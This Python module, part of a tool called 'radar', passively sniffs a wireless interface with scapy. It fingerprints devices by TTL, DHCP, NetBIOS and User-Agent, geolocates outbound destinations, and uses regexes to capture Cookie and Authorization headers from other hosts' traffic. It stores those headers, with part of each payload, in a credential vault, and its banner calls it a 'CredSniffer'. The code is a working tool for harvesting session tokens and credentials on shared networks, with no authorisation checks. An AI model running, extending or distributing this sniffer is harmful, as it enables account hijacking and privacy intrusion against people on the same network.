import logging
import requests
from scapy.all import sniff, IP, TCP, UDP, DHCP, NBNSQueryRequest, Raw
from radar.database.vault import Vault
from radar.database.models import NetworkDeviceRecord
import time
import re
from datetime import datetime

logger = logging.getLogger("radar.passive")

class PassiveIntelligence:
    def __init__(self):
        self.vault = Vault()
        self.geoip_cache = {}
        # Regex for common credentials in raw traffic
        self.cookie_re = re.compile(r"Cookie: (.*?)\r\n", re.IGNORECASE)
        self.auth_re = re.compile(r"Authorization: (.*?)\r\n", re.IGNORECASE)
        self.user_agent_re = re.compile(r"User-Agent: (.*?)\r\n", re.IGNORECASE)

    def get_geoip(self, ip):
        """Simple Geo-IP lookup with caching to avoid rate limits"""
        if ip in self.geoip_cache:
            return self.geoip_cache[ip]
        
        # Skip private IPs
        if ip.startswith(("192.168.", "10.", "172.16.", "127.")):
            return "Local Network"

        try:
            # Using a free, no-key-required API for this demonstration
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
            if r.status_code == 200:
                data = r.json()
                location = f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
                self.geoip_cache[ip] = location
                return location
        except:
            pass
        return "Unknown Location"

    def process_packet(self, pkt):
        if not pkt.haslayer(IP):
            return

        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        src_mac = pkt.src.upper()
        ttl = pkt[IP].ttl

        # 1. OS Fingerprinting by TTL
        os_guess = "Unknown"
        if ttl > 64 and ttl <= 128:
            os_guess = "Windows"
        elif ttl <= 64:
            os_guess = "Unix-like (Linux/iOS/Android)"

        # 2. Update Basic Device Info
        # We fetch the device first to avoid overwriting good data with "Unknown"
        all_devices = self.vault.get_network_devices()
        device = next((d for d in all_devices if d.mac_address == src_mac), None)
        
        if not device:
            device = NetworkDeviceRecord(
                mac_address=src_mac,
                ip_address=src_ip,
                os_guess=os_guess,
                ttl=ttl,
                first_seen=datetime.now(),
                last_seen=datetime.now()
            )
        else:
            device.ip_address = src_ip
            device.ttl = ttl
            if os_guess != "Unknown":
                device.os_guess = os_guess
            device.last_seen = datetime.now()

        # 3. Hostname Discovery (DHCP)
        if pkt.haslayer(DHCP):
            for opt in pkt[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == 'hostname':
                    device.device_name = opt[1].decode(errors='ignore')
                    logger.info(f"🏷️  DHCP Name: {src_mac} -> {device.device_name}")

        # 4. NetBIOS Discovery
        if pkt.haslayer(NBNSQueryRequest):
            nb_name = pkt[NBNSQueryRequest].QUESTION_NAME.decode(errors='ignore').strip()
            if nb_name:
                device.device_name = nb_name
                device.os_guess = "Windows"

        # 5. Credential & User-Agent Sniffing (TCP Port 80/8080)
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode(errors='ignore')
            
            # Extract User-Agent for better OS guessing
            ua_match = self.user_agent_re.search(payload)
            if ua_match:
                ua = ua_match.group(1)
                if "iPhone" in ua or "iPad" in ua: device.os_guess = "iOS"
                elif "Android" in ua: device.os_guess = "Android"
                elif "Windows" in ua: device.os_guess = "Windows"
                elif "Macintosh" in ua: device.os_guess = "macOS"

            # Capture Cookies/Auth
            cookie_match = self.cookie_re.search(payload)
            if cookie_match:
                self.vault.insert_credential(src_ip, dst_ip, "Cookie", cookie_match.group(1), payload[:200])
                logger.warning(f"🍪 Cookie Captured from {src_ip} for {dst_ip}")

            auth_match = self.auth_re.search(payload)
            if auth_match:
                self.vault.insert_credential(src_ip, dst_ip, "Authorization", auth_match.group(1), payload[:200])
                logger.warning(f"🔑 Auth Header Captured from {src_ip}")

        # Save updates
        self.vault.upsert_network_device(device)

        # 6. Geo-IP Tracking for outbound flows
        if not dst_ip.startswith(("192.168.", "10.", "172.16.", "127.")):
            location = self.get_geoip(dst_ip)
            if location != "Unknown Location":
                # We can store this in the flow service label or a new field
                self.vault.insert_network_flow(datetime.now(), src_ip, dst_ip, pkt[IP].dport, "TCP", f"Geo: {location}", len(pkt))

    def start(self, interface="wlan0"):
        print(f"📡 Radar Passive Intelligence + GeoIP + CredSniffer Active on {interface}")
        sniff(iface=interface, prn=self.process_packet, store=0)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    PassiveIntelligence().start()
